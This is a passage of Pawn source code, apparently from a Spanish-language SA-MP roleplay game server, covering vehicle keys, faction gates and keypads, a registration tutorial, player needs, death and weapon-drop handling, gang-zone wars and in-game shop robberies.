	fclose(Fileh);
	return 1;
}

stock GuardarLlaves(playerid)
{
	new
	    Path[23+MAX_PLAYER_NAME];

	A_Format(Path, "Vehiculos/Llaves/%s.ini", pName(playerid));

	new
		File:Fileh = fopen(Path, io_write),
		str[5];

	foreach(Vehicle, i)
	{
	    if(VehVenta_ID(i) == 0)
		{
			if(Bit_Get(Llave_veh[playerid], i))
			{
			    A_Format(str,"%d\n", i);
				fwrite(Fileh, str);
			}
		}
	}

	fclose(Fileh);

	return 1;
}

stock DarLlavesCuenta(account[], fac)
{
	if(!fac)
	    return 0;

	new
	    Path[23+MAX_PLAYER_NAME];

	A_Format(Path, "Vehiculos/Llaves/%s.ini", account);

	new
		File:Fileh = fopen(Path, io_write),
		str[5];

	foreach(Vehicle, i)
	{
		if(Veh[i][vFaccion] == fac)
		{
		    A_Format(str,"%d\n", i);
			fwrite(Fileh, str);
		}
	}

	fclose(Fileh);
	return 1;
}

stock SacarLlavesCuenta(account[])
{
	new
	    Path[23+MAX_PLAYER_NAME];

	A_Format(Path, "Vehiculos/Llaves/%s.ini", account);

	fremove(Path);
	return 1;
}

MensajeTD(playerid,string[],tiempo)
{
	if(MsgText[playerid] == PlayerText:0)
	{
		Loop(i,strlen(string),0)
		{
		    if(string[i] == '{')
		    {
				strdel(string,i,i+8);
				break;
			}
		}
		MsgText[playerid] = CreatePlayerTextDraw(playerid,320.000000, 340.000000, string);
		PlayerTextDrawAlignment(playerid,MsgText[playerid], 2);
		PlayerTextDrawBackgroundColor(playerid,MsgText[playerid], 255);
		PlayerTextDrawFont(playerid,MsgText[playerid], 1);
		PlayerTextDrawLetterSize(playerid,MsgText[playerid], 0.430000, 1.999999);
		PlayerTextDrawColor(playerid,MsgText[playerid], -1);
		PlayerTextDrawSetOutline(playerid,MsgText[playerid], 0);
		PlayerTextDrawSetProportional(playerid,MsgText[playerid], 1);
		PlayerTextDrawSetShadow(playerid,MsgText[playerid], 2);

		PlayerTextDrawShow(playerid, MsgText[playerid]);

		SetTimerEx("EsconderMsg",tiempo,0,"d",playerid);
	}
	return 1;
}

Error(playerid, error[])
{
	return MensajeTD(playerid, _TD ( error ) , strlen ( error ) * 100);
}


CALLBACK: EsconderMsg(playerid)
{
	PlayerTextDrawDestroy(playerid,MsgText[playerid]);
	MsgText[playerid] = PlayerText:0;
	return 1;
}

OnPlayerFinishTut(playerid)
{
	SetPlayerInterior(playerid, 0);
	CamaraAleatoria(playerid);
    new SDialog[652];
    strcat(SDialog,""#CBLANCO"Ya hemos terminado de configurar tu personaje. Para poder finalizar el registro, y jugar correctamente\n");
	strcat(SDialog,""#CBLANCO"en el servidor, tendrás que hacer un Test de rol, para demostrar sus conocimientos de RolePlay. Si sabe\n");
    strcat(SDialog,""#CBLANCO"rolear,y tiene experiencia en servidores RolePlay, puede saltar el tutorial y pasara directamente al test\n");
    strcat(SDialog,""#CBLANCO"de rol, no obstante si no sabe rolear, vease el tutorial, y luego de ver el tutorial se le hara el test.\n\n");
    strcat(SDialog,""#CINFO"\t¿Qué desea hacer?");
    Dialog(playerid, dSabeReglas ,DIALOG_STYLE_MSGBOX,""#CNARANJA"Información - test de rol",SDialog,"Ver reglas","Saltearlas");

	LimpiarPantalla(playerid,10);
	return 1;
}

CALLBACK: MEANDO(playerid)
{
	if(!IsPlayerConnected(playerid)) return 1;

	if(InfoJugador[playerid][jSexo] == 1)
	{
		if(!(GetPlayerSpecialAction(playerid) & SPECIAL_ACTION_PISSING)) return 1;
	}

	if(InfoJugador[playerid][jOrina] > 5)
	{
		InfoJugador[playerid][jOrina] -= 5.0;
		SetTimerEx("MEANDO",1000,false,"i",playerid);
		GameTextForPlayer(playerid,"~y~meando",1500,1);

	}
	else
	{
	    Mensaje(playerid,-1,"Terminaste. Para dejar de mear, presiona "#CINFO"[F] o [ENTER]");
	    InfoJugador[playerid][jOrina] = 0.0;
	}
	SetProgressBarValue(BOrina[playerid], InfoJugador[playerid][jOrina]);
	UpdateProgressBar(BOrina[playerid], playerid);
	return 1;
}

CALLBACK: DORMIR(playerid)
{
	if(!IsPlayerConnected(playerid)) return 1;
	if(!GetPVarInt(playerid, "DURMIENDO")) return 1;
	if(InfoJugador[playerid][jCansancio] < 100)
	{
	    InfoJugador[playerid][jCansancio] += 1.0;
	    if(!IsPlayerInAnyVehicle(playerid))
	    {
	    	ApplyAnimation(playerid,"BEACH", "bather", 4.0, 1, 0, 0, 0, 0);
		}
		SetTimerEx( "DORMIR", 2000, false, "i", playerid);
		GameTextForPlayer(playerid,"~g~~h~durmiendo...",2500,1);
	}
	else
	{
	    InfoJugador[playerid][jCansancio] = 100.0;
	    if(!IsPlayerInAnyVehicle(playerid))
	    {
		    cmd_detener(playerid, "" );
		}
   		TextDrawHideForPlayer(playerid,Vendado);
	    Mensaje(playerid, -1, "Te despertaste, ya no tenes más sueño");
	    SetPlayerDrunkLevel(playerid, 1000);
	    DeletePVar(playerid, "DURMIENDO");
	    Descongelar(playerid);
	}
	SetProgressBarValue(BCansancio[playerid], InfoJugador[playerid][jCansancio]);
	UpdateProgressBar(BCansancio[playerid], playerid);
	return 1;
}

CALLBACK: DesmarcarPos(playerid,faccion,playerid2)
{
	if(!IsPlayerConnected(playerid)) return 1;
	if(faccion)
	{
		foreach(Player,i) if(InfoJugador[i][jMiembro] == faccion || InfoJugador[i][jLider] == faccion)
		{
			SetPlayerMarkerForPlayer(i, playerid, 0xFFFFFF00);
		}
	}
	else
	{
	    SetPlayerMarkerForPlayer(playerid2, playerid, 0xFFFFFF00);
	}
	return 1;
}

Float:frandom(Float:max, Float:min = 0.0, dp = 4) // by: Y_Less
{
    new
        Float:mul = floatpower(10.0, dp),
        imin = floatround(min * mul),
        imax = floatround(max * mul);

    return float(random(imax - imin) + imin) / mul;
}



public OnGameModeExit()
{
	foreach(Player,i)
	{
		ActualizarCuenta(i);
		Kick(i);
	}
	return 1;
}

CALLBACK: RecargarBalas(playerid, weap)
{
	new balas = GetPlayerAmmo(playerid);
	GivePlayerWeapon(playerid, weap, -balas);
	GivePlayerWeapon(playerid, weap,  balas);
	return 1;
}


stock Portones(playerid)
{
	Loop(i, MAX_PORTONES, 0)
	{
		if(InfoPorton_Ex[i][pX] == 0.0)
			continue;
			
	    if(IsPlayerInRangeOfPoint(playerid,20.0,InfoPorton_Ex[i][pX],InfoPorton_Ex[i][pY],InfoPorton_Ex[i][pZ]))
	    {
			if(InfoPorton_Ex[i][portFamilia])
			{
			    if(ID_Familia(playerid) == InfoPorton_Ex[i][portFamilia])
			    {
					new time = MoveDynamicObject(   InfoPorton_Ex[i][portID],
													InfoPorton_Ex[i][pAX],
													InfoPorton_Ex[i][pAY],
													InfoPorton_Ex[i][pAZ],
													InfoPorton_Ex[i][portVelocidad]);


					SetTimerEx("CerrarPorton_Ex",time+4000,false, "i", i);
					AutoRol(playerid,"abre el porton con su control remoto");
					return 1;
				}
			}
			else if(InfoPorton_Ex[i][portCasa])
			{
				if(TieneLlaveCasa(playerid, InfoPorton_Ex[i][portCasa]))
				{
					new time = MoveDynamicObject(   InfoPorton_Ex[i][portID],
													InfoPorton_Ex[i][pAX],
													InfoPorton_Ex[i][pAY],
													InfoPorton_Ex[i][pAZ],
													InfoPorton_Ex[i][portVelocidad]);


					SetTimerEx("CerrarPorton_Ex",time+4000,false, "i", i);
					AutoRol(playerid,"abre el porton con su control remoto");
					return 1;
				}
			}
	    }
	}
	return 0;
}

CALLBACK: CerrarPorton_Ex(i)
{
	MoveDynamicObject(  InfoPorton_Ex[i][portID],
						InfoPorton_Ex[i][pX],
						InfoPorton_Ex[i][pY],
						InfoPorton_Ex[i][pZ],
						InfoPorton_Ex[i][portVelocidad]);
	return 1;
}


public OnPlayerDeath(playerid,killerid,reason)
{
	if(InfoJugador[playerid][jMuerto] == false)
	{
	    new
	        Float:x, Float:y, Float:z, Float: Angle;

	    GetPlayerPos(playerid,x, y, z);
		GetPlayerFacingAngle(playerid, Angle);

	    InfoJugador[playerid][jMuerto] = true;

     	SetPVarInt(playerid,"ULTIMO_VW", GetPlayerVirtualWorld(playerid) );
    	SetPVarInt(playerid,"ULTIMO_INT", GetPlayerInterior(playerid) );

		SetSpawnInfo(playerid, 0, GetPlayerSkin(playerid), x, y, z, Angle, 0, 0, 0, 0, 0, 0);
	}
	else
	{
	    InfoJugador[playerid][jMuerto] = false;

	   	new
			rVal = random(sizeof randHospital);

		SetSpawnInfo(playerid, 0, GetPlayerSkin(playerid), randHospital[rVal][Posx], randHospital[rVal][Posy], randHospital[rVal][Posz], 0.0, 0, 0, 0, 0, 0, 0);

	}

	if(killerid != INVALID_PLAYER_ID)
	{
	    new
	        Killer[MAX_PLAYER_NAME];
		GetPlayerName(killerid, Killer, MAX_PLAYER_NAME );
		SetPVarString(playerid, "QFA", Killer );
	}
	
	Loop(i, MAX_PCP, 0)
	{
 		DestroyPCP(playerid, i);
	}

/*    if(reason == 4)
    {
		if(IsPlayerInDynamicArea(killerid, zCamionerosLVL1))
		{
			MandarCarcel(killerid, 20, true);
		}
		else
		{
		    MensajeAdminF(C_ROJO, "[AntiDM] "#CBLANCO"%s(%d) mató a %s(%d) con cuchillo.", Ayudante, NombreJugador_(killerid), killerid, NombreJugador_(playerid), playerid);
		}
	}*/
	if(reason == 0)
	{
	    if(IsPlayerInDynamicArea(killerid, zCamionerosLVL1))
	    {
		    MandarCarcel(killerid, 20, true);
			MensajeTodosF(C_ROJO, "[ADMINISTRACIÓN] "#CBLANCO"%s fue encarcelado automáticamente 20 minutos por DM.", NombreJugador_(killerid) );
		}
	}
	
	KillTimer2(playerid, TIMER_VAAMORIR);

	if(GetPVarInt(playerid,"USANDO_BAZOKA") || GetPVarInt(playerid,"USANDO_MINIGUN") )
	{
	    DeletePVar(playerid,"USANDO_BAZOKA");
	    DeletePVar(playerid,"USANDO_MINIGUN");
 	}
 	if(GetPVarInt(playerid,"LIC_Segundos"))
 	{
		GameTextForPlayer(playerid,"~r~Test desaprobado",6000,3);
		DestroyPCP(playerid, CP_LICENCIAVEH);
		SetVehicleToRespawn(GetPlayerVehicleID(playerid));
		AutoLicenciaUsado[GetPVarInt(playerid, "LIC_VEH_INDEX")][GetPVarInt(playerid, "LIC_VEH_INDEX_2")] = false;
		DeletePVar(playerid,"LIC_Segundos");
		DeletePVar(playerid, "LIC_VEH_INDEX");
		DeletePVar(playerid, "LIC_VEH_INDEX_2");
	}
	if(GetPVarInt(playerid,"USANDO_MASCARA"))
	{
		DeletePVar(playerid,"USANDO_MASCARA");
	}

	SetPVarInt(playerid, "Spawneo", 1);

	DeletePVar(playerid,"TerminoBasura");
	DeletePVar(playerid,"CAMION_BASURA");
	DeletePVar(playerid,"B_ParteLimpieza");

	Bit_Set(AnimsLocked, playerid, false);

	HideProgressBarForPlayer(playerid,BCosecha[playerid]);

	if(GetPVarInt(playerid,"EN_ESTADIO")) DeletePVar(playerid,"EN_ESTADIO");

	Loop(i, sizeof Camillas, 0) if(InfoCamilla[i][camiUsadaPor] == playerid)
	{
        InfoCamilla[i][camiUsadaPor] = INVALID_PLAYER_ID;
        KillTimer2(playerid, TIMER_CAMILLA);
        return 1;
	}

 	SacarVelocimetro(playerid);

	if(GetPVarInt(playerid,PVarRepartidorB))
	{
		DestroyPCP(playerid, CP_REPARTIDORB);
	    DeletePVar(playerid,PVarRepartidorB);
		HideProgressBarForPlayer(playerid,BCosecha[playerid]);
	}
	if(!EsDeFacLegal(playerid))
	{
		if(IsPlayerAttachedObjectSlotUsed(playerid,SLOT_ARMADURA))
		{
			new i = SlotObjeto_T();
			if(i == -1)
			{
				Error(playerid,"Tu armadura se perdió porque no se encontro un espacio en la memoria.");
				goto Start_GW;
			}
			new s = SLOT_ARMADURA;
	  		InfoObjeto_T[i][VWOBJ] = GetPlayerVirtualWorld(playerid);
			InfoObjeto_T[i][IntOBJ] = GetPlayerInterior(playerid);
			InfoJugador[playerid][jAttachModel][s] = 0;
			InfoJugador[playerid][jAttachBone][s] = 2;
			InfoJugador[playerid][jAttachPosx][s] = 0;
			InfoJugador[playerid][jAttachPosy][s] = 0;
			InfoJugador[playerid][jAttachPosz][s] = 0;
			InfoJugador[playerid][jAttachAngx][s] = 0;
			InfoJugador[playerid][jAttachAngy][s] = 0;
			InfoJugador[playerid][jAttachAngz][s] = 0;
			InfoJugador[playerid][jAttachEscx][s] = 1;
			InfoJugador[playerid][jAttachEscy][s] = 1;
			InfoJugador[playerid][jAttachEscz][s] = 1;
			RemovePlayerAttachedObject(playerid,s);
			GetPlayerArmour(playerid,InfoObjeto_T[i][ArmaduraOBJ]);
			SetPlayerArmour(playerid,0);
			GetPlayerPos(playerid,InfoObjeto_T[i][Posx],InfoObjeto_T[i][Posy],InfoObjeto_T[i][Posz]);
			InfoObjeto_T[i][Posx] += frandom( 1.0, -1.0 );
			InfoObjeto_T[i][Posy] += frandom( 1.0, -1.0 );
			OBJ_T[i] = CreateDynamicObject(373,InfoObjeto_T[i][Posx],InfoObjeto_T[i][Posy],InfoObjeto_T[i][Posz]-0.55,-24.69,-56.19,0.0,InfoObjeto_T[i][VWOBJ],InfoObjeto_T[i][IntOBJ]);
	   		InfoObjeto_T[i][TipoOBJ] = OBJ_CHALECO;
	   		Label_OBJ_T[i] = CreateDynamic3DTextLabel("Armadura tirada",C_BLANCO,InfoObjeto_T[i][Posx],InfoObjeto_T[i][Posy],InfoObjeto_T[i][Posz]-0.3,5,0xFFFF,0xFFFF,0,InfoObjeto_T[i][VWOBJ],InfoObjeto_T[i][IntOBJ]);
			InfoObjeto_T[i][TickOBJ] = GetTickCount();
			ActualizarAccesorios(playerid,s);
		}
		new Arma[13],Balas[13];
		Loop(w,13,1)
		{
			GetPlayerWeaponData(playerid,w,Arma[w],Balas[w]);
			if(Arma[w] && Balas[w])
			{
				new i = SlotObjeto_T();
				if(i == -1)
				{
					Error(playerid,"Tu arma se perdió porque no se encontro un espacio en la memoria.");
					goto Start_GW;
				}
	            InfoObjeto_T[i][VWOBJ] = GetPlayerVirtualWorld(playerid);
				InfoObjeto_T[i][IntOBJ] = GetPlayerInterior(playerid);
				GetPlayerPos(playerid,InfoObjeto_T[i][Posx],InfoObjeto_T[i][Posy],InfoObjeto_T[i][Posz]);
	            InfoObjeto_T[i][TipoOBJ] = OBJ_ARMA;
	            new Str[50],Weap[20];
	            GetWeaponName(Arma[w],Weap,sizeof Weap);
	            A_Format(Str,"%s tirado/a",Weap);
				InfoObjeto_T[i][Posx] += frandom( 1.0, -1.0 );
				InfoObjeto_T[i][Posy] += frandom( 1.0, -1.0 );
				OBJ_T[i] = CreateDynamicObject(GetGunObjectID(Arma[w]),InfoObjeto_T[i][Posx],InfoObjeto_T[i][Posy],InfoObjeto_T[i][Posz]-0.9,90.0,0.0,0.0,InfoObjeto_T[i][VWOBJ],InfoObjeto_T[i][IntOBJ]);
	            Label_OBJ_T[i] = CreateDynamic3DTextLabel(Str,C_BLANCO,InfoObjeto_T[i][Posx],InfoObjeto_T[i][Posy],InfoObjeto_T[i][Posz]-0.3,5,0xFFFF,0xFFFF,0,InfoObjeto_T[i][VWOBJ],InfoObjeto_T[i][IntOBJ]);
				InfoObjeto_T[i][ArmaOBJ] = Arma[w];
				InfoObjeto_T[i][BalasOBJ] = Balas[w];
				InfoObjeto_T[i][TickOBJ] = GetTickCount();
			}
		}
	}
	
    Start_GW:

	if(killerid != INVALID_PLAYER_ID)
	{
		if(InfoFamilia[ID_Familia(playerid)][fPandilla] && InfoFamilia[ID_Familia(killerid)][fPandilla] && ID_Familia(killerid) != ID_Familia(playerid))
		{
			new GZ = GetPlayerGangZone(playerid);
			if(GZ == -1) goto FinishGangWar;

			if(gzAtacadaPor[GZ] != -1) goto FinishGangWar;

			if(PandillerosEnGangZone(ID_Familia(killerid), GZ) < MIN_ATACANTES_GZ)
			{
			    Mensaje(killerid, -1,  "Si deseas generar una guerra por este territorio, deben estar");
			    Mensaje(killerid, -1, "presentes refuerzos de tu pandilla, minimo "#MIN_ATACANTES_GZ".");
			    goto FinishGangWar;
			}

			gzAtacadaPor[GZ] = ID_Familia(killerid);
			gzTiempo[GZ] = 0;
			GangZoneFlashForAll(InfoGZ[GZ][gzID], C_GZ_EN_GUERRA );

			new
				MapIconID,
				Float:Poss[3];

			GetPlayerPos(playerid, Poss[0], Poss[1], Poss[2]);

			switch(ID_Familia(playerid))
			{
			    case 1: //Grooves
			    {
			        MapIconID = 62;
				}
				case 2: //Ballas
				{
			        MapIconID = 59;
				}
				case 3: //Sureños
				{
			        MapIconID = 58;
				}
				default: MapIconID = 58;
			}

	  		MensajeFamiliaF(ID_Familia(playerid), "¡Los %s quieren conquistar nuestra zona, a defenderla! "#CROJO"Se marcó su posición con el icono", InfoFamilia[ID_Familia(killerid)][fNombre] );

			foreach(Player,i) if(ID_Familia(i) == ID_Familia(playerid))
			{
	    		SetPlayerMapIcon(i, MI_GANGWARS, Poss[0], Poss[1], 5.0, MapIconID, -1, MAPICON_GLOBAL);
			}
		}

		FinishGangWar:

		if(EsHitman(killerid))
		{
			Loop(i, sizeof InfoContrato, 0)
			{
			    if(strlen(InfoContrato[i][hitPor]) && InfoContrato[i][hitDinero])
			    {
					if(!strcmp(pName(playerid), InfoContrato[i][hitVictima]))
					{
					    GivePlayerMoney(killerid, InfoContrato[i][hitDinero]);
					    Mensaje(killerid, -1, "Cumpliste tu misión como hitman, se te pagó lo acordado.");
					    foreach(Player,p)
					    {
					        if(!strcmp(pName(p), InfoContrato[i][hitPor]))
					        {
					            MensajeF(p, -1, "El HITMAN %s cumplió con su palabra, y asesinó a "#CROJO"%s.", NombreJugador_(killerid), NombreJugador_(playerid) );
								break;
							}
						}
					    ClearString(InfoContrato[i][hitPor]);
					    ClearString(InfoContrato[i][hitVictima]);
					    InfoContrato[i][hitDinero] = 0;
					    ActualizarContratos();
					}
				}
			}
		}
	}
	return 1;
}

stock EsDeFacLegal(playerid)
{
	return  (
				EsLSPD(playerid)
			 || EsMilitar(playerid)
			 || EsMedico(playerid)
			 || EsDelGobierno(playerid)
			 || EsReportero(playerid)
		 	 || EsMecanico(playerid)
		  	);
}
 
stock CargarGangZones2(playerid)
{
	Loop(i, MAX_GZS, 0)
	{
	    if( IsValidGangZone(i) )
	    {
	        if( gzAtacadaPor[i] == -1 )
	        {
	        	GangZoneShowForPlayer(playerid, InfoGZ[i][gzID], ColoresGZ[InfoGZ[i][gzPandilla]]);
			}
	        else
	        {
				GangZoneFlashForPlayer(playerid, InfoGZ[i][gzID], C_GZ_EN_GUERRA );
			}
		}
	}
	return 1;
}

stock CrearGangZone(ID,Float:Minx,Float:Miny,Float:Maxx,Float:Maxy, Familia = 0)
{
	if(InfoGZ[ID][gzID]) return printf("BUG: Se intentó sobreescribir una GangZone [ ID: %d ]", ID);

	InfoGZ[ID][gzID] = GangZoneCreate(Minx, Miny, Maxx, Maxy);
	GangZoneShowForAll(InfoGZ[ID][gzID], ColoresGZ[Familia] );

    Bit_Set( ValidGZ, ID, true );

	return 1;
}

stock CreateKeyPad(Float:x, Float:y, Float:z, Float: Angle = 0.0, vwid = -1, intid = -1)
{
	new
		slot = -1;

	for(new i = 0; i < MAX_KEYPAD; i++)
	{
		if(KeyPadInfo[i][kpPosx] == 0.0)
		{
			slot = i;
			break;
		}
	}

	if(slot == -1)
	{
		printf("[ERROR]: No se pudieron crear más KeyPads (Aumentar MAX_KEYPAD)");
		return -1;
	}

	CreateDynamicObject(OBJ_KeyPad, x, y, z, 0.0, 0.0, Angle, vwid, intid);

	KeyPadInfo[slot][kpPosx] = x;
	KeyPadInfo[slot][kpPosy] = y;
	KeyPadInfo[slot][kpPosz] = z;
	KeyPadInfo[slot][kpAngle] = Angle;
	//CreateDynamic3DTextLabel("Presiona "#CINFO"Y", 0xFFFFFFFF, x, y, z+0.5, 2.0);

	Iter_Add(KeyPads, slot);

	return slot;
}

stock PlayerWatchPlayer(playerid, targetid)
{
	new
	    Float: P[4], Float: z;

	GetPlayerPos(playerid, P[0], P[1], z);
	GetPlayerPos(targetid, P[2], P[3], z);

	SetPlayerFacingAngle(playerid, floatabs(360.0-atan2(P[2]-P[0], P[3]-P[1])) );
	return 1;
}

CALLBACK: OnPlayerPressKeyPad(playerid, KeyPadID)
{
	if(KeyPadID == KP_AscensorLSPD)
	{
	    if(!EsLSPD(playerid)) return GameTextForPlayer(playerid, "~r~acceso denegado", 3000, 3);
 		SetTimer("AscensorLSPD",6000,0);
		MoveDynamicObject(PALSPD1,253.10000610,110.90000153,1003.59997559,1,-1000.0,-1000.0,-1000.0);
		MoveDynamicObject(PALSPD2,253.10000610,107.30000305,1003.59997559,1,-1000.0,-1000.0,-1000.0);
	    return 1;
	}
	if(KeyPadID == KP_HabitacionLSMD[0] || KeyPadID == KP_HabitacionLSMD[1])
	{
	    if(!EsMedico(playerid)) return GameTextForPlayer(playerid, "~r~acceso denegado", 3000, 3);

	    static
	        bool: Opened;

		if(!Opened)
		{
	    	MoveDynamicObject(PHLSMD, 2546.2546, 1264.7469, 865.2559, 4.0);
	    	Opened = true;
		}
		else
		{
	    	MoveDynamicObject(PHLSMD, 2547.5451, 1264.6682, 865.2559, 4.0);
	    	Opened = false;
		}
	    return 1;
	}
	if(KeyPadID == KP_DirectorLSMD[0] || KeyPadID == KP_DirectorLSMD[1])
	{
	    if(!EsMedico(playerid)) return GameTextForPlayer(playerid, "~r~acceso denegado", 3000, 3);

	    static
	        bool: Opened;

		if(!Opened)
		{
	    	MoveDynamicObject(PDLSMD, 2543.2363, 1272.0522, 865.2559, 4.0);
	    	Opened = true;
		}
		else
		{
	    	MoveDynamicObject(PDLSMD, 2543.2097, 1270.8, 865.2559, 4.0);
	    	Opened = false;
		}

	    return 1;
	}
	if(KeyPadID == KP_EntradaCarceles[0] || KeyPadID == KP_EntradaCarceles[1])
	{
	    if(!EsLSPD(playerid)) return GameTextForPlayer(playerid, "~r~acceso denegado", 3000, 3);

	    static
	        bool: Opened;

		if(!Opened)
		{
			MoverObjeto(PCELDAS[2],2529.24, -1288.55, 1030.11);
	    	Opened = true;
		}
		else
		{
	    	MoverObjeto(PCELDAS[2], 2529.24, -1290.99, 1030.11);
	    	Opened = false;
		}

	    return 1;
	}
	if(KeyPadID == KP_PortonEjercito[0] || KeyPadID == KP_PortonEjercito[1])
	{
	    if(!EsMilitar(playerid)) return GameTextForPlayer(playerid, "~r~acceso denegado", 3000, 3);

	    static
	        bool: Opened;

		if(!Opened)
		{
			MoverObjeto(PEJERCITO1,2720.30004883,-2414.19995117,14.19999981);
	    	Opened = true;
		}
		else
		{
	    	MoverObjeto(PEJERCITO1,2720.30004883,-2405.39990234,14.19999981);
	    	Opened = false;
		}

	    return 1;
	}
	if(KeyPadID == KP_PortonEjercito2[0] || KeyPadID == KP_PortonEjercito2[1])
	{
	    if(!EsMilitar(playerid)) return GameTextForPlayer(playerid, "~r~acceso denegado", 3000, 3);

	    static
	        bool: Opened;

		if(!Opened)
		{
			MoverObjeto(PEJERCITO2,2720.30004883,-2512.89990234,14.19999981);
	    	Opened = true;
		}
		else
		{
	    	MoverObjeto(PEJERCITO2,2720.30004883,-2504.00000000,14.19999981);
	    	Opened = false;
		}

	    return 1;
	}
	if(KeyPadID == KP_Mecas[0] || KeyPadID == KP_Mecas[1])
	{
	    if(!EsMecanico(playerid)) return GameTextForPlayer(playerid, "~r~acceso denegado", 3000, 3);

	    static
	        bool: Opened;

		if(!Opened)
		{
			MoverObjeto(PMECAS[0],1729.313232,-2064.226806,16.021608);
	    	Opened = true;
		}
		else
		{
	    	MoverObjeto(PMECAS[0],1729.770385,-2072.675781,16.081611);
	    	Opened = false;
		}

	    return 1;
	}
	if(KeyPadID == KP_Mecas2[0] || KeyPadID == KP_Mecas2[1])
	{
	    if(!EsMecanico(playerid)) return GameTextForPlayer(playerid, "~r~acceso denegado", 3000, 3);

	    static
	        bool: Opened;

		if(!Opened)
		{
			MoverObjeto(PMECAS[1],1812.724121,-2056.923583,15.228534);
	    	Opened = true;
		}
		else
		{
	    	MoverObjeto(PMECAS[1],1812.724487, -2066.374511,15.228534);
	    	Opened = false;
		}

	    return 1;
	}
	return 1;
}

CALLBACK: MostrarTutorial(playerid)
{
	if(InfoJugador[playerid][jRegistrado]) return 1;

	new
	    i = GetPVarInt(playerid, "Parte_tutorial");

	if(i < sizeof(Tutorial))
	{
	    if(!i)
	    {
			TutoCuerpo[playerid] = CreatePlayerTextDraw(playerid, 20.000000, 160.000000, "_");
			PlayerTextDrawBackgroundColor(playerid, TutoCuerpo[playerid], 255);
			PlayerTextDrawFont(playerid, TutoCuerpo[playerid], 1);
			PlayerTextDrawLetterSize(playerid, TutoCuerpo[playerid], 0.250000, 1.500000);
			PlayerTextDrawColor(playerid, TutoCuerpo[playerid], -1);
			PlayerTextDrawSetOutline(playerid, TutoCuerpo[playerid], 1);
			PlayerTextDrawSetProportional(playerid, TutoCuerpo[playerid], 1);
			PlayerTextDrawUseBox(playerid, TutoCuerpo[playerid], 1);
			PlayerTextDrawBoxColor(playerid, TutoCuerpo[playerid], 4485504);
			PlayerTextDrawTextSize(playerid, TutoCuerpo[playerid], 191.000000, 0.000000);
			PlayerTextDrawSetSelectable(playerid, TutoCuerpo[playerid], 0);

			TutoTitulo[playerid] = CreatePlayerTextDraw(playerid, 37.000000, 145.000000, "_");
			PlayerTextDrawBackgroundColor(playerid, TutoTitulo[playerid], 255);
			PlayerTextDrawFont(playerid, TutoTitulo[playerid], 3);
			PlayerTextDrawLetterSize(playerid, TutoTitulo[playerid], 0.300000, 1.500000);
			PlayerTextDrawColor(playerid, TutoTitulo[playerid], -1835756160);
			PlayerTextDrawSetOutline(playerid, TutoTitulo[playerid], 1);
			PlayerTextDrawSetProportional(playerid, TutoTitulo[playerid], 1);
			PlayerTextDrawSetSelectable(playerid, TutoTitulo[playerid], 0);

			PlayerTextDrawShow(playerid, TutoCuerpo[playerid]);
			PlayerTextDrawShow(playerid, TutoTitulo[playerid]);

			SetPlayerInterior(playerid, 0);
			TogglePlayerSpectating(playerid, true);

		}

	    new
	        String[500];

		strunpack(String, Tutorial[i][tutCuerpo], 500);

		PlayerTextDrawSetString(playerid, TutoCuerpo[playerid], String);

	    SetTimerEx("MostrarTutorial", strlen(String)*60, false, "i", playerid);

		strunpack(String, Tutorial[i][tutTitulo], 500);

		PlayerTextDrawSetString(playerid, TutoTitulo[playerid], String);

	    SetPVarInt(playerid, "Parte_tutorial", i+1);

	    SetPlayerCameraPos(playerid, Tutorial[i][tutCamPos][0], Tutorial[i][tutCamPos][1], Tutorial[i][tutCamPos][2]);
	    SetPlayerCameraLookAt(playerid, Tutorial[i][tutCamPos][3], Tutorial[i][tutCamPos][4], Tutorial[i][tutCamPos][5]);
	}
	else
	{
		DeletePVar(playerid, "Parte_tutorial");
		OnPlayerFinishTut(playerid);
		PlayerTextDrawDestroy(playerid, TutoCuerpo[playerid]);
		PlayerTextDrawDestroy(playerid, TutoTitulo[playerid]);
	}
	return 1;
}

stock IsValidGangZone(ID)
{
	return (Bit_Get( ValidGZ, ID )) ? (true) : (false);
}

stock CrearRango(ID_FAC, Rango[] )
{
	if(ID_FAC <= 0 || ID_FAC >= MAX_FACCIONES) return printf("BUG: Se intentó crear un rango en un index inválido");
	if(strlen(Rango) > MAX_RANGO_LEN) return printf("BUG: Se intentó crear un rango demaciado largo (%d-%s)",ID_FAC, Rango);

	static
	    RankCount[MAX_FACCIONES];

	RankCount[ID_FAC] ++;

	alm(InfoRango[ID_FAC][RankCount[ID_FAC]], Rango);
	return 1;
}

stock CrearRangoL(ID_FAC, Rango[] )
{
	if(ID_FAC <= 0 || ID_FAC >= MAX_FACCIONES) return printf("BUG: Se intentó crear un rango en un index inválido");
	if(strlen(Rango) > MAX_RANGO_LEN) return printf("BUG: Se intentó crear un rango lider demaciado largo (%d-%s)",ID_FAC, Rango);

	alm(InfoLider[ID_FAC], Rango);
	return 1;
}

stock IsValidRank(ID_FAC, Index)
{
	return ( isnull(InfoRango[ID_FAC][Index]) ) ? (false) : (true);
}


CALLBACK: Robar(playerid, item)
{
	if(!IsPlayerConnected(playerid)) return 1;
	switch(item)
	{
		case 0:
		{
		    new rMSG = random(5), MSG[90];

		    new
		        NegID = ID_Negocio(playerid);

		    if(rMSG == 0) 	   MSG = "¡No me hagas daño! Te daré todo el dinero";
		    else if(rMSG == 1) MSG = "¡No me lastimes porfavor! te daré todo.";
		    else if(rMSG == 2) MSG = "Tranquilizate, solo espera que te dare el dinero";
		    else if(rMSG == 3) MSG = "Tranquilo, no me lastimes. Aqui te doy todo";
		    else if(rMSG == 4) MSG = "¡No por favor! Tengo familia, no me mates. Te dare todo.";

   			#if defined USE_FCNPC
		    SetPlayerChatBubble(NPC_NEGOCIO[NegID], MSG, C_INFO, 25.0, 4000);
		    #else
		    strins(MSG, "Vendedor(a): ", 0);
			ProxDetector(20,playerid,MSG,-1,Hablar,Hablar2,Hablar3,Hablar4);
			#endif

		    foreach(Player,i)
		    {
				if(EsLSPD(i))
				{
					MensajeF(i,C_INFO, "[TORRE DE CONTROL] "#CBLANCO"¡El Negocio "#CVERDE"%s "#CBLANCO"fue robado!. Sus coordenadas se marcaron en el mapa "#CROJO"(Punto rojo)", InfoNegocio[ID_Negocio(playerid)][nNombre]);
					CheckpointGPS(i, InfoNegocio[NegID][nEntrada_x], InfoNegocio[NegID][nEntrada_y], InfoNegocio[NegID][nEntrada_z], 1.0);
				}
			}
			//ApplyAnimation(NPC_NEGOCIO[NegID], "ped", "cower", 4.0, 1, 0, 0, 0, 0);
			SetTimerEx("Robar", 4000, false, "ii", playerid, 1);
		}
		case 1:
		{
		    new
				Val = 350+random(2000),
				NegID = ID_Negocio(playerid);

